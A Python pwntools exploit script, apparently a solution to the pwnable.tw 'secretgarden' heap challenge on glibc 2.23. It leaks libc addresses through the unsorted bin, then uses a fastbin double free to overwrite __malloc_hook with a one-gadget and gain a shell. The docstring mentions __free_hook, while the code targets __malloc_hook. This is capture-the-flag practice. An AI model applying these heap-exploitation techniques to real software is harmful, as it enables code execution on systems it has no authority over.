#!/usr/bin/env python3
from pwn import *
from sys import argv
"""
glibc 2.23 so no tcache or mitigations... yay
1. unsorted bin leak fd/bk pointers for libc
2. overwrite __free_hook with one gadget
3. call hook

struct flower {
  int64_t is_alive;
  char* name;
  char color[0x18];
};
"""
binary = ELF('secretgarden', checksec=0)
lib_path = "/glibc/2.23/64/lib"
libc = ELF('libc_64.so.6', checksec=0)
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('chall.pwnable.tw', 10203)
else:
  p = process([lib_path+'/ld-2.23.so', './secretgarden'],env={'LD_PRELOAD':'libc_64.so.6'})
s = lambda x, r="" : \
  p.sendafter(r, x) if r else p.send(x)
sl = lambda x, r="" : \
  p.sendlineafter(r, x) if r else p.sendline(x)

def raise_flower(length, name=b'A', color=b'A'):
  log.info(f"raise_flower({length}, {name}, {color})")
  s(b'1', b'choice : ')
  sl(str(length).encode(), b'name :')
  s(name, b'flower :')
  sl(color, b'the flower :')

def visit_garden():
  log.info("visit_garden()")
  s(b'2', b'choice : ')
  return p.recvuntil(b'\xe2\x98\x86')

def remove_flower(index):
  log.info(f"remove_flower({index})")
  s(b'3', b'choice : ')
  sl(str(index).encode(), b'garden:')

def clean_garden():
  log.info("clean_garden()")
  s(b'4', b'choice : ')

pause()

# leak unsorted bin pointers
# 0x410 outside of tcache bin field, im debugging on glibc 2.31
raise_flower(0x410)
raise_flower(0x60)
raise_flower(0x410)
raise_flower(0x60)
remove_flower(0)
remove_flower(2)
raise_flower(0x410, b'C'*8, b'D'*8)
arena_base = int.from_bytes(visit_garden().split(b'\n')[4][-6:], 'little')-1096
libc_base = arena_base - 0x3c3b20
malloc_hook = libc_base + 0x3c3b10

log.info("Arena base address: %#lx" % arena_base)
log.info("Libc base address: %#lx" % libc_base)
log.info("Malloc hook address: %#lx" % malloc_hook)

# fastbin dup
remove_flower(1)
remove_flower(3)
remove_flower(1)

one_gadget = 0xef6c4
raise_flower(0x90, b'freeme')
raise_flower(0x60, p64(malloc_hook-0x23))
raise_flower(0x60)
raise_flower(0x60)
raise_flower(0x60, b'A'*0x13+p64(one_gadget+libc_base))

remove_flower(5)
remove_flower(5)
p.interactive()
